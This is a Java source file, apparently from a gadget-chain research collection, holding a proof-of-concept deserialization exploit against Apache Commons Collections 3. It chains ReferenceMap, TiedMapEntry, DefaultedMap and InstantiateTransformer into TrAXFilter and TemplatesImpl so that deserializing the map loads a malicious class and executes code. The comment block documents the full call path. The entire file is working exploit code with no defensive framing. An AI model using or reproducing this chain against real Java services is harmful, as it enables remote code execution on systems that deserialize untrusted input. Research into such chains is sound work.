package com.example.CC3;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import com.example.Utils.Share;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.DefaultedMap;
import org.apache.commons.collections.map.ReferenceMap;

import javax.xml.transform.Templates;

public class POC_6 {

    /***
     * <org.apache.commons.collections.map.ReferenceMap: void readObject(java.io.ObjectInputStream)>
     * <org.apache.commons.collections.map.AbstractReferenceMap: void doReadObject(java.io.ObjectInputStream)>
     * <org.apache.commons.collections.map.AbstractReferenceMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
     * <org.apache.commons.collections.map.AbstractHashedMap: int hash(java.lang.Object)>
     * <org.apache.commons.collections.keyvalue.TiedMapEntry: int hashCode()>
     * <org.apache.commons.collections.keyvalue.TiedMapEntry: java.lang.Object getValue()>
     * <org.apache.commons.collections.map.DefaultedMap: java.lang.Object get(java.lang.Object)>
     * <org.apache.commons.collections.functors.InstantiateTransformer: java.lang.Object transform(java.lang.Object)>
     * <com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter: void init(javax.xml.transform.Templates)>
     * <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl: javax.xml.transform.Transformer newTransformer(javax.xml.transform.Templates)>
     * <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl: com.sun.org.apache.xalan.internal.xsltc.Translet getTransletInstance(javax.xml.transform.Templates)>
     * <java.lang.reflect.Constructor: java.lang.Object newInstance(java.lang.Object[])>
     */

    public static void main(String[] args) throws Exception {
        Templates templates = Share.getTemplatesImplObj();
        InstantiateTransformer transformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
        DefaultedMap d = new DefaultedMap("1");
        TiedMapEntry t = new TiedMapEntry(d, TrAXFilter.class);
        ReferenceMap map = new ReferenceMap();
        map.put(t, "value");

        ReflectionUtil.setField(d, "value", transformer);
        SerializeUtil.deserialize(SerializeUtil.serialize(map));
    }

}
